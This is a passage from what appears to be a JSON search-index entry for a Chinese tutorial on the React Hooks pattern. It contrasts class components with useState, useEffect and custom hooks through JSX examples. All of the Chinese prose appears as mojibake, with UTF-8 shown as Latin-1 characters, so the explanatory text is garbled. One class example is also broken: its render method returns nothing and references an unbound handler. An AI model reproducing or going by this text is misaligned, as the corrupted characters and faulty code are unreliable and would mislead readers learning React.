ç±»çš„å·¥ä½œåŸç†ã€‚ ä¸ºä»€ä¹ˆæˆ‘ä»¬å¿…é¡»ç»‘å®šè‡ªå®šä¹‰æ–¹æ³•ï¼Ÿ æ„é€ å‡½æ•°æ˜¯åšä»€ä¹ˆçš„ï¼Ÿ this å…³é”®å­—ä»ä½•è€Œæ¥ï¼Ÿ å¾ˆéš¾çŸ¥é“å¦‚ä½•æ­£ç¡®é‡æ„ç»„ä»¶è€Œä¸æ„å¤–æ›´æ”¹æ•°æ®æµã€‚\né‡æ„ åœ¨å¤šä¸ªç»„ä»¶ä¹‹é—´å…±äº«ä»£ç çš„å¸¸ç”¨æ–¹æ³•æ˜¯ä½¿ç”¨é«˜é˜¶ç»„ä»¶æˆ–æ¸²æŸ“é“å…·æ¨¡å¼ã€‚ å°½ç®¡è¿™ä¸¤ç§æ¨¡å¼éƒ½æ˜¯æœ‰æ•ˆçš„å¹¶ä¸”æ˜¯ä¸€ç§å¾ˆå¥½çš„åšæ³•ï¼Œä½†ç¨åæ·»åŠ è¿™äº›æ¨¡å¼éœ€è¦æ‚¨é‡æ–°æ„å»ºåº”ç”¨ç¨‹åºã€‚\né™¤äº†å¿…é¡»é‡æ„æ‚¨çš„åº”ç”¨ç¨‹åºï¼ˆç»„ä»¶è¶Šå¤§è¶Šæ£˜æ‰‹ï¼‰ï¼Œä¸ºäº†åœ¨æ›´æ·±çš„åµŒå¥—ç»„ä»¶ä¹‹é—´å…±äº«ä»£ç è€Œæ‹¥æœ‰è®¸å¤šåŒ…è£…ç»„ä»¶å¯èƒ½ä¼šå¯¼è‡´æœ€å¥½å°†å…¶ç§°ä¸ºåŒ…è£…å™¨åœ°ç‹±ã€‚ æ‰“å¼€å¼€å‘å·¥å…·å¹¶çœ‹åˆ°ç±»ä¼¼äºä»¥ä¸‹å†…å®¹çš„ç»“æ„å¹¶ä¸å°‘è§ï¼š\n\u0026lt;WrapperOne\u0026gt;\r\u0026lt;WrapperTwo\u0026gt;\r\u0026lt;WrapperThree\u0026gt;\r\u0026lt;WrapperFour\u0026gt;\r\u0026lt;WrapperFive\u0026gt;\r\u0026lt;Component\u0026gt;\r\u0026lt;h1\u0026gt;Finally in the component!\u0026lt;/h1\u0026gt;\r\u0026lt;/Component\u0026gt;\r\u0026lt;/WrapperFive\u0026gt;\r\u0026lt;/WrapperFour\u0026gt;\r\u0026lt;/WrapperThree\u0026gt;\r\u0026lt;/WrapperTwo\u0026gt;\r\u0026lt;/WrapperOne\u0026gt; åŒ…è£…å™¨åœ°ç‹±ä¼šä½¿æ‚¨éš¾ä»¥ç†è§£æ•°æ®å¦‚ä½•æµç»æ‚¨çš„åº”ç”¨ç¨‹åºï¼Œä»è€Œæ›´éš¾å¼„æ¸…æ¥šä¸ºä»€ä¹ˆä¼šå‘ç”Ÿæ„å¤–è¡Œä¸ºã€‚\nå¤æ‚ éšç€æˆ‘ä»¬å‘ç±»ç»„ä»¶æ·»åŠ æ›´å¤šé€»è¾‘ï¼Œç»„ä»¶çš„å¤§å°ä¼šå¿«é€Ÿå¢åŠ ã€‚ è¯¥ç»„ä»¶å†…çš„é€»è¾‘å¯èƒ½ä¼šå˜å¾—æ··ä¹±å’Œéç»“æ„åŒ–ï¼Œè¿™ä¼šä½¿å¼€å‘äººå‘˜éš¾ä»¥ç†è§£ç±»ç»„ä»¶ä¸­ä½¿ç”¨æŸäº›é€»è¾‘çš„ä½ç½®ã€‚ è¿™ä¼šä½¿è°ƒè¯•å’Œä¼˜åŒ–æ€§èƒ½å˜å¾—æ›´åŠ å›°éš¾ã€‚\nç”Ÿå‘½å‘¨æœŸæ–¹æ³•ä¹Ÿéœ€è¦å¤§é‡çš„ä»£ç é‡å¤ã€‚ æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼Œå®ƒä½¿ç”¨äº†ä¸€ä¸ª Counter ç»„ä»¶å’Œä¸€ä¸ª Width ç»„ä»¶ã€‚\nimport React from \u0026#34;react\u0026#34;;\rimport \u0026#34;./styles.css\u0026#34;;\rimport { Count } from \u0026#34;./Count\u0026#34;;\rimport { Width } from \u0026#34;./Width\u0026#34;;\rexport default class Counter extends React.Component {\rconstructor() {\rsuper();\rthis.state = {\rcount: 0,\rwidth: 0\r};\r}\rcomponentDidMount() {\rthis.handleResize();\rwindow.addEventListener(\u0026#34;resize\u0026#34;, this.handleResize);\r}\rcomponentWillUnmount() {\rwindow.removeEventListener(\u0026#34;resize\u0026#34;, this.handleResize);\r}\rincrement = () =\u0026gt; {\rthis.setState(({ count }) =\u0026gt; ({ count: count + 1 }));\r};\rdecrement = () =\u0026gt; {\rthis.setState(({ count }) =\u0026gt; ({ count: count - 1 }));\r};\rhandleResize = () =\u0026gt; {\rthis.setState({ width: window.innerWidth });\r};\rrender() {\rreturn (\r\u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt;\r\u0026lt;Count\rcount={this.state.count}\rincrement={this.increment}\rdecrement={this.decrement}\r/\u0026gt;\r\u0026lt;div id=\u0026#34;divider\u0026#34; /\u0026gt;\r\u0026lt;Width width={this.state.width} /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r} App ç»„ä»¶çš„ç»“æ„æ–¹å¼å¯ä»¥å¦‚ä¸‹æ‰€ç¤ºï¼š\nè™½ç„¶è¿™æ˜¯ä¸€ä¸ªå¾ˆå°çš„ç»„ä»¶ï¼Œä½†æ˜¯ç»„ä»¶å†…éƒ¨çš„é€»è¾‘å·²ç»å¾ˆæ··ä¹±äº†ã€‚ æŸäº›éƒ¨åˆ†ç‰¹å®šäºè®¡æ•°å™¨é€»è¾‘ï¼Œè€Œå…¶ä»–éƒ¨åˆ†ç‰¹å®šäºå®½åº¦é€»è¾‘ã€‚ éšç€ç»„ä»¶çš„å¢é•¿ï¼Œåœ¨ç»„ä»¶å†…æ„å»ºé€»è¾‘ã€åœ¨ç»„ä»¶å†…æ‰¾åˆ°ç›¸å…³é€»è¾‘ä¼šå˜å¾—è¶Šæ¥è¶Šå›°éš¾ã€‚\né™¤äº†æ··ä¹±çš„é€»è¾‘ï¼Œæˆ‘ä»¬è¿˜åœ¨ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ä¸­å¤åˆ¶äº†ä¸€äº›é€»è¾‘ã€‚ åœ¨ componentDidMount å’Œ componentWillUnmount ä¸­ï¼Œæˆ‘ä»¬æ ¹æ®çª—å£çš„è°ƒæ•´å¤§å°äº‹ä»¶è‡ªå®šä¹‰åº”ç”¨ç¨‹åºçš„è¡Œä¸ºã€‚\n\rHooks å¾ˆæ˜æ˜¾ï¼Œç±»ç»„ä»¶åœ¨ React ä¸­å¹¶ä¸æ€»æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ç‰¹æ€§ã€‚ ä¸ºäº†è§£å†³ React å¼€å‘è€…åœ¨ä½¿ç”¨ç±»ç»„ä»¶æ—¶å¯èƒ½é‡åˆ°çš„å¸¸è§é—®é¢˜ï¼ŒReact å¼•å…¥äº† React Hooksã€‚ React Hooks æ˜¯å¯ç”¨äºç®¡ç†ç»„ä»¶çŠ¶æ€å’Œç”Ÿå‘½å‘¨æœŸæ–¹æ³•çš„å‡½æ•°ã€‚\nReact Hooks å¯ä»¥ï¼š\n å‘åŠŸèƒ½ç»„ä»¶æ·»åŠ çŠ¶æ€ ç®¡ç†ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸï¼Œè€Œæ— éœ€ä½¿ç”¨è¯¸å¦‚ componentDidMount å’Œ componentWillUnmount ä¹‹ç±»çš„ç”Ÿå‘½å‘¨æœŸæ–¹æ³• åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºçš„å¤šä¸ªç»„ä»¶ä¹‹é—´é‡ç”¨ç›¸åŒçš„æœ‰çŠ¶æ€é€»è¾‘  é¦–å…ˆï¼Œè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹å¦‚ä½•ä½¿ç”¨ React Hooks å‘åŠŸèƒ½ç»„ä»¶æ·»åŠ çŠ¶æ€ã€‚\nstate React æä¾›äº†ä¸€ä¸ªé’©å­æ¥ç®¡ç†åŠŸèƒ½ç»„ä»¶ä¸­çš„çŠ¶æ€ï¼Œç§°ä¸º useStateã€‚\nè®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•ä½¿ç”¨ useState é’©å­å°†ç±»ç»„ä»¶é‡ç»„ä¸ºåŠŸèƒ½ç»„ä»¶ã€‚ æœ‰ä¸€ä¸ªåä¸º Input çš„ç±»ç»„ä»¶ï¼Œå®ƒåªæ˜¯æ¸²æŸ“ä¸€ä¸ªè¾“å…¥å­—æ®µã€‚ æ¯å½“ç”¨æˆ·åœ¨è¾“å…¥å­—æ®µä¸­è¾“å…¥ä»»ä½•å†…å®¹æ—¶ï¼ŒçŠ¶æ€ä¸­è¾“å…¥çš„å€¼å°±ä¼šæ›´æ–°ã€‚\nclass Input extends React.Component {\rconstructor() {\rsuper();\rthis.state = { input: \u0026#34;\u0026#34; };\rthis.handleInput = this.handleInput.bind(this);\r}\rhandleInput(e) {\rthis.setState({ input: e.target.value });\r}\rrender() {\r\u0026lt;input onChange={handleInput} value={this.state.input} /\u0026gt;;\r}\r} ä¸ºäº†ä½¿ç”¨ useState é’©å­ï¼Œæˆ‘ä»¬éœ€è¦è®¿é—® React ä¸ºæˆ‘ä»¬æä¾›çš„ useState æ–¹æ³•ã€‚ useState æ–¹æ³•éœ€è¦ä¸€ä¸ªå‚æ•°ï¼šè¿™æ˜¯çŠ¶æ€çš„åˆå§‹å€¼ï¼Œåœ¨æœ¬ä¾‹ä¸­ä¸ºç©ºå­—ç¬¦ä¸²ã€‚\næˆ‘ä»¬å¯ä»¥ä» useState æ–¹æ³•ä¸­è§£æ„ä¸¤ä¸ªå€¼ï¼š\n çŠ¶æ€çš„å½“å‰å€¼ æ›´æ–°çŠ¶æ€çš„æ–¹æ³•  const [value, setValue] = React.useState(initialValue); ç¬¬ä¸€ä¸ªå€¼å¯ä»¥ä¸ç±»ç»„ä»¶çš„ this.state.[value] è¿›è¡Œæ¯”è¾ƒã€‚ ç¬¬äºŒä¸ªå€¼å¯ä»¥ä¸ç±»ç»„ä»¶çš„ this.setState æ–¹æ³•è¿›è¡Œæ¯”è¾ƒã€‚\nç”±äºæˆ‘ä»¬æ­£åœ¨å¤„ç†è¾“å…¥çš„å€¼ï¼Œè®©æˆ‘ä»¬è°ƒç”¨çŠ¶æ€è¾“å…¥çš„å½“å‰å€¼ï¼Œä»¥åŠæ›´æ–°çŠ¶æ€ setInput çš„æ–¹æ³•ã€‚ åˆå§‹å€¼åº”è¯¥æ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚\nconst [input, setInput] = React.useState(\u0026#34;\u0026#34;); ç°åœ¨å¯ä»¥å°† Input ç±»ç»„ä»¶é‡æ„ä¸ºæœ‰çŠ¶æ€çš„åŠŸèƒ½ç»„ä»¶ã€‚\nfunction Input() {\rconst [input, setInput] = React.useState(\u0026#34;\u0026#34;);\rconsole.log(input)\rreturn \u0026lt;input onChange={(e) =\u0026gt; setInput(e.target.value)} value={input} /\u0026gt;;\r} è¾“å…¥å­—æ®µçš„å€¼ç­‰äºè¾“å…¥çŠ¶æ€çš„å½“å‰å€¼ï¼Œå°±åƒåœ¨ç±»ç»„ä»¶ç¤ºä¾‹ä¸­ä¸€æ ·ã€‚ å½“ç”¨æˆ·åœ¨è¾“å…¥å­—æ®µä¸­è¾“å…¥æ—¶ï¼Œè¾“å…¥çŠ¶æ€çš„å€¼ä¼šä½¿ç”¨ setInput æ–¹æ³•ç›¸åº”æ›´æ–°ã€‚\nEffect Hook æˆ‘ä»¬å·²ç»çœ‹åˆ°å¯ä»¥ä½¿ç”¨ useState ç»„ä»¶æ¥å¤„ç†åŠŸèƒ½ç»„ä»¶å†…çš„çŠ¶æ€ï¼Œä½†æ˜¯ç±»ç»„ä»¶çš„å¦ä¸€ä¸ªå¥½å¤„æ˜¯å¯ä»¥å‘ç»„ä»¶æ·»åŠ ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ã€‚\nä½¿ç”¨ useEffect é’©å­ï¼Œæˆ‘ä»¬å¯ä»¥â€œé’©å…¥â€ç»„ä»¶ç”Ÿå‘½å‘¨æœŸã€‚ useEffect é’©å­æœ‰æ•ˆåœ°ç»“åˆäº† componentDidMountã€componentDidUpdate å’Œ componentWillUnmount ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ã€‚\ncomponentDidMount() { ... }\ruseEffect(() =\u0026gt; { ... }, [])\rcomponentWillUnmount() { ... }\ruseEffect(() =\u0026gt; { return () =\u0026gt; { ... } })\rcomponentDidUpdate() { ... }\ruseEffect(() =\u0026gt; { ... }) è®©æˆ‘ä»¬ä½¿ç”¨åœ¨ state éƒ¨åˆ†ä¸­ä½¿ç”¨çš„è¾“å…¥ç¤ºä¾‹ã€‚ æ¯å½“ç”¨æˆ·åœ¨è¾“å…¥å­—æ®µä¸­è¾“å…¥ä»»ä½•å†…å®¹æ—¶ï¼Œæˆ‘ä»¬è¿˜å¸Œæœ›å°†è¯¥å€¼è®°å½•åˆ°æ§åˆ¶å°ã€‚\næˆ‘ä»¬éœ€è¦ä½¿ç”¨â€œç›‘å¬â€è¾“å…¥å€¼çš„ useEffect é’©å­ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†è¾“å…¥æ·»åŠ åˆ° useEffect é’©å­çš„ä¾èµ–é¡¹æ•°ç»„æ¥å®ç°ã€‚ ä¾èµ–æ•°ç»„æ˜¯ useEffect é’©å­æ¥æ”¶çš„ç¬¬äºŒä¸ªå‚æ•°ã€‚\nimport React, { useState, useEffect } from \u0026#34;react\u0026#34;;\rexport default function Input() {\rconst [input, setInput] = useState(\u0026#34;\u0026#34;);\ruseEffect(() =\u0026gt; {\rconsole.log(`The user typed ${input}`);\r}, [input]);\rreturn (\r\u0026lt;input\ronChange={e =\u0026gt; setInput(e.target.value)}\rvalue={input}\rplaceholder=\u0026#34;Type something...\u0026#34;\r/\u0026gt;\r);\r} æ¯å½“ç”¨æˆ·é”®å…¥å€¼æ—¶ï¼Œè¾“å…¥çš„å€¼ç°åœ¨éƒ½ä¼šè®°å½•åˆ°æ§åˆ¶å°ã€‚\nè‡ªå®šä¹‰ Hooks é™¤äº† React æä¾›çš„å†…ç½®é’©å­\nï¼ˆuseStateã€useEffectã€useReducerã€useRefã€useContextã€useMemoã€useImperativeHandleã€useLayoutEffectã€useDebugValueã€useCallbackï¼‰ï¼Œ\næˆ‘ä»¬è¿˜å¯ä»¥è½»æ¾åˆ›å»ºè‡ªå·±çš„è‡ªå®šä¹‰é’©å­ã€‚\nä½ å¯èƒ½å·²ç»æ³¨æ„åˆ°ï¼Œæ‰€æœ‰çš„é’©å­éƒ½æ˜¯ä»useå¼€å¤´çš„ã€‚ ä¸ºäº†è®© React æ£€æŸ¥å®ƒæ˜¯å¦è¿åäº† Hooks çš„è§„åˆ™ï¼Œå¼€å¤´useé’©å­æ˜¯å¾ˆé‡è¦çš„ã€‚\nHooks çš„å¦ä¸€ä¸ªå·¨å¤§ä¼˜åŠ¿æ˜¯ç¤¾åŒºå¯ä»¥æ„å»ºå’Œå…±äº« hooksã€‚ æˆ‘ä»¬æœ‰æ—¶å€™æ²¡å¿…è¦è‡ªå·±ç¼–å†™é’©å­ï¼ è‡ªå®šä¹‰é’©å­å·²ç»ç”±å…¶ä»–äººæ„å»ºï¼Œå¦‚æœå®‰è£…å®ƒï¼Œå°±å¯ä»¥åœ¨æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨å®ƒï¼\nè¿™é‡Œæœ‰ä¸€äº›ç½‘ç«™åˆ—å‡ºäº†ç¤¾åŒºæ„å»ºçš„æ‰€æœ‰é’©å­ï¼Œå¹¶å‡†å¤‡åœ¨æ‚¨çš„åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨ã€‚\n React Use useHooks React Hooks çš„é›†åˆ  \ré™„åŠ  Hooks æŒ‡å— æ·»åŠ  Hooks ä¸å…¶ä»–ç»„ä»¶ä¸€æ ·ï¼Œå½“æ‚¨æƒ³å°† Hooks æ·»åŠ åˆ°æ‚¨ç¼–å†™çš„ä»£ç ä¸­æ—¶ï¼Œä¼šä½¿ç”¨ä¸€äº›ç‰¹æ®Šçš„å‡½æ•°ã€‚ ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§ Hook å‡½æ•°çš„ç®€è¦æ¦‚è¿°ï¼š\n1. useState\nuseState Hook ä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿæ›´æ–°å’Œæ“ä½œå‡½æ•°ç»„ä»¶å†…çš„çŠ¶æ€ï¼Œè€Œæ— éœ€å°†å…¶è½¬æ¢ä¸ºç±»ç»„ä»¶ã€‚ è¿™ä¸ª Hook çš„ä¸€ä¸ªä¼˜ç‚¹æ˜¯å®ƒå¾ˆç®€å•ï¼Œä¸éœ€è¦åƒå…¶ä»– React Hook é‚£æ ·å¤æ‚ã€‚\n2. useEffect\nuseEffect Hook ç”¨äºåœ¨å‡½æ•°ç»„ä»¶ä¸­çš„ä¸»è¦ç”Ÿå‘½å‘¨æœŸäº‹ä»¶æœŸé—´è¿è¡Œä»£ç ã€‚\nå‡½æ•°ç»„ä»¶çš„ä¸»ä½“ä¸å…è®¸çªå˜ã€è®¢é˜…ã€è®¡æ—¶å™¨ã€æ—¥å¿—è®°å½•å’Œå…¶ä»–å‰¯ä½œç”¨ã€‚ å¦‚æœå…è®¸ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´ UI ä¸­å‡ºç°ä»¤äººå›°æƒ‘çš„é”™è¯¯å’Œä¸ä¸€è‡´ã€‚\nuseEffect é’©å­å¯ä»¥é˜²æ­¢æ‰€æœ‰è¿™äº›â€œå‰¯ä½œç”¨â€ï¼Œå¹¶å…è®¸ UI å¹³ç¨³è¿è¡Œã€‚ å®ƒæ˜¯ componentDidMount ã€ componentDidUpdate å’Œ componentWillUnmount çš„ç»„åˆã€‚\n3. useContext\nuseContext Hook æ¥å—ä¸€ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œå®ƒæ˜¯ä» React.createcontext è¿”å›çš„å€¼ï¼Œå¹¶è¿”å›è¯¥ä¸Šä¸‹æ–‡çš„å½“å‰ä¸Šä¸‹æ–‡å€¼ã€‚ useContext Hook è¿˜ä¸ React Context API ä¸€èµ·ä½¿ç”¨ï¼Œä»¥ä¾¿åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­å…±äº«æ•°æ®ï¼Œè€Œæ— éœ€é€šè¿‡å„ä¸ªçº§åˆ«å‘ä¸‹ä¼ é€’æ‚¨çš„åº”ç”¨ç¨‹åºé“å…·ã€‚\nåº”è¯¥æ³¨æ„çš„æ˜¯ï¼Œä¼ é€’ç»™ useContext é’©å­çš„å‚æ•°å¿…é¡»æ˜¯ä¸Šä¸‹æ–‡å¯¹è±¡æœ¬èº«ï¼Œå¹¶ä¸”ä»»ä½•è°ƒç”¨ useContext çš„ç»„ä»¶æ€»æ˜¯åœ¨ä¸Šä¸‹æ–‡å€¼æ›´æ”¹æ—¶é‡æ–°æ¸²æŸ“ã€‚\n4. useReducer\nuseReducer Hook æä¾›äº† setState çš„æ›¿ä»£æ–¹æ¡ˆï¼Œå½“æ‚¨æœ‰æ¶‰åŠå¤šä¸ªå­å€¼çš„å¤æ‚çŠ¶æ€é€»è¾‘æˆ–ä¸‹ä¸€ä¸ªçŠ¶æ€ä¾èµ–äºå‰ä¸€ä¸ªçŠ¶æ€æ—¶ï¼Œå°¤å…¶é€‚åˆä½¿ç”¨å®ƒã€‚\nå®ƒæ¥å—ä¸€ä¸ª reducer å‡½æ•°å’Œä¸€ä¸ªåˆå§‹çŠ¶æ€è¾“å…¥ï¼Œå¹¶é€šè¿‡æ•°ç»„è§£æ„çš„æ–¹å¼è¿”å›å½“å‰çŠ¶æ€å’Œä¸€ä¸ª dispatch å‡½æ•°ä½œä¸ºè¾“å‡ºã€‚\nuseReducer è¿˜ä¼˜åŒ–äº†è§¦å‘æ·±åº¦æ›´æ–°çš„ç»„ä»¶çš„æ€§èƒ½ã€‚\nä½¿ç”¨ Hooks çš„ä¼˜ç¼ºç‚¹ ä»¥ä¸‹æ˜¯ä½¿ç”¨ Hook çš„ä¸€äº›å¥½å¤„ï¼š\næ›´å°‘çš„ä»£ç è¡Œ Hooks å…è®¸æ‚¨æŒ‰å…³æ³¨ç‚¹å’ŒåŠŸèƒ½è€Œä¸æ˜¯æŒ‰ç”Ÿå‘½å‘¨æœŸå¯¹ä»£ç è¿›è¡Œåˆ†ç»„ã€‚ è¿™ä½¿å¾—ä»£ç ä¸ä»…æ›´æ¸…æ™°ç®€æ´ï¼Œè€Œä¸”æ›´çŸ­ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨ React çš„å¯æœç´¢äº§å“æ•°æ®è¡¨çš„ç®€å•æ— çŠ¶æ€ç»„ä»¶çš„æ¯”è¾ƒï¼Œä»¥åŠä½¿ç”¨ useState å…³é”®å­—åå®ƒåœ¨ Hooks ä¸­çš„å¤–è§‚ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  //classæ— çŠ¶æ€ç»„ä»¶ class TweetSearchResults extends React.Component { constructor(props) { super(props); this.state = { filterText: \u0026#39;\u0026#39;, inThisLocation: false }; this.handleFilterTextChange = this.handleFilterTextChange.bind(this); this.handleInThisLocationChange = this.handleInThisLocationChange.bind(this); } handleFilterTextChange(filterText) { this.setState({ filterText: filterText }); } handleInThisLocationChange(inThisLocation) { this.setState({ inThisLocation: inThisLocation }) } render() { return ( \u0026lt;div\u0026gt; \u0026lt;SearchBar filterText={this.state.filterText} inThisLocation={this.state.inThisLocation} onFilterTextChange={this.handleFilterTextChange} onInThisLocationChange={this.handleInThisLocationChange} /\u0026gt; \u0026lt;TweetList tweets={this.props.tweets} filterText={this.state.filterText} inThisLocation={this.state.inThisLocation} /\u0026gt; \u0026lt;/div\u0026gt; ); } }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  //ä½¿ç”¨ Hooks ç›¸åŒçš„ç»„ä»¶ const TweetSearchResults = ({tweets}) =\u0026gt; { const [filterText, setFilterText] = useState(\u0026#39;\u0026#39;); const [inThisLocation, setInThisLocation] = useState(false); return ( \u0026lt;div\u0026gt; \u0026lt;SearchBar filterText={filterText} inThisLocation={inThisLocation} setFilterText={setFilterText} setInThisLocation={setInThisLocation} /\u0026gt; \u0026lt;TweetList tweets={tweets} filterText={filterText} inThisLocation={inThisLocation} /\u0026gt; \u0026lt;/div\u0026gt; ); }   ç®€åŒ–å¤æ‚çš„ç»„ä»¶\nJavaScript ç±»å¯èƒ½éš¾ä»¥ç®¡ç†ï¼Œéš¾ä»¥ä¸çƒ­é‡è½½ä¸€èµ·ä½¿ç”¨ï¼Œå¹¶ä¸”å¯èƒ½æ— æ³•ç¼©å°ã€‚\nReact Hooks è§£å†³äº†è¿™äº›é—®é¢˜å¹¶ç¡®ä¿å‡½æ•°å¼ç¼–ç¨‹å˜å¾—ç®€å•ã€‚ é€šè¿‡ Hooks çš„å®ç°ï¼Œæˆ‘ä»¬ä¸éœ€è¦ç±»ç»„ä»¶ã€‚\né‡ç”¨æœ‰çŠ¶æ€é€»è¾‘\nJavaScript ä¸­çš„ç±»é¼“åŠ±å¤šå±‚æ¬¡çš„ç»§æ‰¿ï¼Œè¿™ä¼šè¿…é€Ÿå¢åŠ æ•´ä½“å¤æ‚æ€§å’Œå‡ºé”™çš„å¯èƒ½æ€§ã€‚\nä½†æ˜¯ï¼ŒHooks å…è®¸æ‚¨åœ¨ä¸ç¼–å†™ç±»çš„æƒ…å†µä¸‹ä½¿ç”¨çŠ¶æ€å’Œå…¶ä»– React åŠŸèƒ½ã€‚ ä½¿ç”¨ Reactï¼Œæ‚¨å¯ä»¥éšæ—¶é‡ç”¨æœ‰çŠ¶æ€é€»è¾‘ï¼Œè€Œæ— éœ€ä¸€éåˆä¸€éåœ°é‡å†™ä»£ç ã€‚ è¿™å‡å°‘äº†å‡ºé”™çš„æœºä¼šï¼Œå¹¶å…è®¸ä½¿ç”¨æ™®é€šå‡½æ•°è¿›è¡Œç»„åˆã€‚\nå…±äº«éè§†è§‰é€»è¾‘\nåœ¨ Hooks å®ç°ä¹‹å‰ï¼ŒReact æ— æ³•æå–å’Œå…±äº«éå¯è§†åŒ–é€»è¾‘ã€‚ è¿™æœ€ç»ˆå¯¼è‡´äº†æ›´å¤šçš„å¤æ‚æ€§ï¼Œä¾‹å¦‚ HOC æ¨¡å¼å’Œ render é“å…·ï¼Œåªæ˜¯ä¸ºäº†è§£å†³ä¸€ä¸ªå¸¸è§é—®é¢˜ã€‚\nä½†æ˜¯ï¼ŒHooks çš„å¼•å…¥è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œå› ä¸ºå®ƒå…è®¸å°†æœ‰çŠ¶æ€çš„é€»è¾‘æå–åˆ°ä¸€ä¸ªç®€å•çš„ JavaScript å‡½æ•°ä¸­ã€‚\nå½“ç„¶ï¼ŒHooks æœ‰ä¸€äº›æ½œåœ¨çš„ç¼ºç‚¹å€¼å¾—ç‰¢è®°ï¼š\n å¿…é¡»å°Šé‡å®ƒçš„è§„åˆ™ï¼Œæ²¡æœ‰ linter æ’ä»¶ï¼Œå¾ˆéš¾çŸ¥é“å“ªä¸ªè§„åˆ™è¢«ç ´åäº†ã€‚ éœ€è¦ç›¸å½“é•¿çš„æ—¶é—´ç»ƒä¹ æ‰èƒ½æ­£ç¡®ä½¿ç”¨ï¼ˆExpï¼šuseEffectï¼‰ã€‚ æ³¨æ„é”™è¯¯çš„ä½¿ç”¨ï¼ˆExpï¼šuseCallbackï¼ŒuseMemoï¼‰ã€‚  Hooks vs ç±» ä½¿ç”¨ React Hooks å¯ä»¥æ›´æ¸…æ™°åœ°å°†æˆ‘ä»¬ç»„ä»¶çš„é€»è¾‘åˆ†æˆå‡ ä¸ªæ›´å°çš„éƒ¨åˆ†ã€‚ é‡ç”¨ç›¸åŒçš„æœ‰çŠ¶æ€é€»è¾‘å˜å¾—æ›´åŠ å®¹æ˜“ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è®©ç»„ä»¶æœ‰çŠ¶æ€ï¼Œæˆ‘ä»¬ä¸å†éœ€è¦å°†åŠŸèƒ½ç»„ä»¶é‡å†™ä¸ºç±»ç»„ä»¶ã€‚ ä¸å†éœ€è¦å¯¹ ES2015 ç±»æœ‰å¾ˆå¥½çš„äº†è§£ï¼Œå¹¶ä¸”å…·æœ‰å¯é‡ç”¨çš„æœ‰çŠ¶æ€é€»è¾‘å¢åŠ äº†ç»„ä»¶çš„å¯æµ‹è¯•æ€§ã€çµæ´»æ€§å’Œå¯è¯»æ€§ã€‚\nå½“ Hooks è¢«å¼•å…¥ React æ—¶ï¼Œå®ƒäº§ç”Ÿäº†ä¸€ä¸ªæ–°é—®é¢˜ï¼šæˆ‘ä»¬å¦‚ä½•çŸ¥é“ä»€ä¹ˆæ—¶å€™ä½¿ç”¨å¸¦æœ‰ Hooks å’Œç±»ç»„ä»¶çš„å‡½æ•°ç»„ä»¶ï¼Ÿ\nåœ¨ Hooks çš„å¸®åŠ©ä¸‹ï¼Œå³ä½¿åœ¨å‡½æ•°ç»„ä»¶ä¸­ä¹Ÿå¯ä»¥è·å–çŠ¶æ€å’Œéƒ¨åˆ†ç”Ÿå‘½å‘¨æœŸ Hooksã€‚\nHooks è¿˜å…è®¸æ‚¨åœ¨ä¸ç¼–å†™ç±»çš„æƒ…å†µä¸‹ä½¿ç”¨æœ¬åœ°çŠ¶æ€å’Œå…¶ä»– React åŠŸèƒ½ã€‚\nä»¥ä¸‹æ˜¯ Hooks å’Œ Classes ä¹‹é—´çš„ä¸€äº›å·®å¼‚ï¼Œä»¥å¸®åŠ©æ‚¨åšå‡ºå†³å®šï¼š\n   React Hooks class     å®ƒæœ‰åŠ©äºé¿å…å¤šä¸ªå±‚æ¬¡ç»“æ„å¹¶ä½¿ä»£ç æ›´æ¸…æ™° ä¸€èˆ¬æ¥è¯´ï¼Œå½“ä½ ä½¿ç”¨ HOC æˆ– renderProps æ—¶ï¼Œå½“ä½ å°è¯•åœ¨ DevTools ä¸­çœ‹åˆ°å®ƒæ—¶ï¼Œä½ å¿…é¡»ç”¨å¤šä¸ªå±‚æ¬¡ç»“æ„é‡æ„ä½ çš„ App   å®ƒæä¾›äº† React ç»„ä»¶ä¹‹é—´çš„ä¸€è‡´æ€§ã€‚ ç”±äºéœ€è¦äº†è§£ç»‘å®šå’Œè°ƒç”¨å‡½æ•°çš„ä¸Šä¸‹æ–‡ï¼Œç±»ä¼šæ··æ·†äººç±»å’Œæœºå™¨ã€‚    \rçŸ¥è¯†ç‚¹  useState useEffect useContext useReducer  ","description":"ä½¿ç”¨å‡½æ•°åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºçš„å¤šä¸ªç»„ä»¶ä¹‹é—´é‡ç”¨æœ‰çŠ¶æ€é€»è¾‘","id":123,"section":"react-patterns","tags":null,"title":"Hooks æ¨¡å¼","uri":"https://codthing.github.io/react-patterns/design-patterns/hooks-pattern/"},{"content":"åœ¨ä¹‹å‰çš„æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬ä»‹ç»äº† SSR å’Œ Hydration å¦‚ä½•æ”¹å–„ç”¨æˆ·ä½“éªŒã€‚\nReact èƒ½å¤Ÿï¼ˆå¿«é€Ÿï¼‰ä½¿ç”¨ react-dom/server 